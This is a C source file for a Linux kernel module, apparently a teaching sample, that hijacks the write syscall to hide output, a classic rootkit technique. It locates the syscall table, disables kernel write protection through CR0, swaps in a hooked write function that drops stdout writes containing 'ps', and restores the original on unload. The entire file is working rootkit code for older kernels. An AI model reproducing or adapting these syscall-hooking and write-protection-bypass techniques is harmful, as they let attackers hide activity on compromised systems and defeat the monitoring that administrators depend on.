/* This code no longer works on 7.0 kernel. It only works on older kernels. */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jidong Xiao");
MODULE_DESCRIPTION("This module hijacks the write syscall and hide the ps process");

static asmlinkage ssize_t (*original_write)(int fd, const char __user *buf, size_t count);
static long **sys_call_table;

static void disable_wp(void) { write_cr0(read_cr0() & (~0x10000)); }
static void enable_wp(void)  { write_cr0(read_cr0() | 0x10000); }

static asmlinkage ssize_t hooked_write(int fd, const char __user *buf, size_t count)
{
    char kbuf[128];
    if (fd == 1 && count < sizeof(kbuf)) {
        if (copy_from_user(kbuf, buf, count))
            return -EFAULT;
        kbuf[count] = '\0';
        if (strstr(kbuf, "ps\n"))
            return count;
    }
    return original_write(fd, buf, count);
}

static int __init hide_init(void)
{
    sys_call_table = (long **)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table)
        return -1;

    disable_wp();
    original_write = (void *)sys_call_table[__NR_write];
    sys_call_table[__NR_write] = (long *)hooked_write;
    enable_wp();

    printk(KERN_INFO "hide_ps: module loaded, ps will not show the ps itself\n");
    return 0;
}

static void __exit hide_exit(void)
{
    if (sys_call_table) {
        disable_wp();
        sys_call_table[__NR_write] = (long *)original_write;
        enable_wp();
    }
    printk(KERN_INFO "hide_ps: module unloaded, ps restored\n");
}

module_init(hide_init);
module_exit(hide_exit);
